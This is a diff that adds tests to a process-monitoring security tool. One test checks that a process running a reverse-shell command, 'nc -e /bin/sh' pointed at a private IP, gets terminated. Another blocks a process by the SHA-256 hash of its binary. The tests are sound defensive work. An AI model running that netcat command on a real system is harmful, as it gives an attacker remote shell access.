@@ -1,6 +1,7 @@
 import pytest
 from unittest.mock import MagicMock, patch
 import sys
+import hashlib
 
 # --- MOCKING STRATEGY ---
 mock_psutil = MagicMock()
@@ -11,6 +12,11 @@ from guardian.runtime.monitor import RuntimeMonitor
 @pytest.fixture
 def setup_mocks():
     mock_psutil.reset_mock()
+    # Ensure exception attributes are valid exception classes for except blocks.
+    mock_psutil.NoSuchProcess = ProcessLookupError
+    mock_psutil.AccessDenied = PermissionError
+    mock_psutil.ZombieProcess = RuntimeError
+    mock_psutil.TimeoutExpired = TimeoutError
     return mock_psutil
 
 @pytest.fixture
@@ -98,3 +104,42 @@ def test_monitoring_thread_start_stop(monitor):
         
         monitor.stop()
         assert monitor._stop_event.is_set()
+
+
+def test_check_processes_blocks_reverse_shell_cmdline(monitor):
+    proc = MagicMock()
+    proc.info = {
+        'pid': 999,
+        'name': 'python.exe',
+        'cmdline': ['python.exe', '-c', 'nc -e /bin/sh 10.0.0.1 4444'],
+        'exe': None,
+    }
+    proc.wait.return_value = None
+    monitor.safe_pids = set()
+    mock_psutil.process_iter.return_value = [proc]
+
+    monitor.check_processes()
+
+    proc.terminate.assert_called_once()
+
+
+def test_check_processes_blocks_by_hash(monitor, tmp_path):
+    fake_bin = tmp_path / "safe_app.exe"
+    fake_bin.write_bytes(b"simulated binary content for hash block")
+    blocked_hash = hashlib.sha256(fake_bin.read_bytes()).hexdigest()
+    monitor.blocked_process_hashes = {blocked_hash}
+    monitor.safe_pids = set()
+
+    proc = MagicMock()
+    proc.info = {
+        'pid': 1001,
+        'name': 'safe_app.exe',
+        'cmdline': ['safe_app.exe'],
+        'exe': str(fake_bin),
+    }
+    proc.wait.return_value = None
+    mock_psutil.process_iter.return_value = [proc]
+
+    monitor.check_processes()
+
+    proc.terminate.assert_called_once()
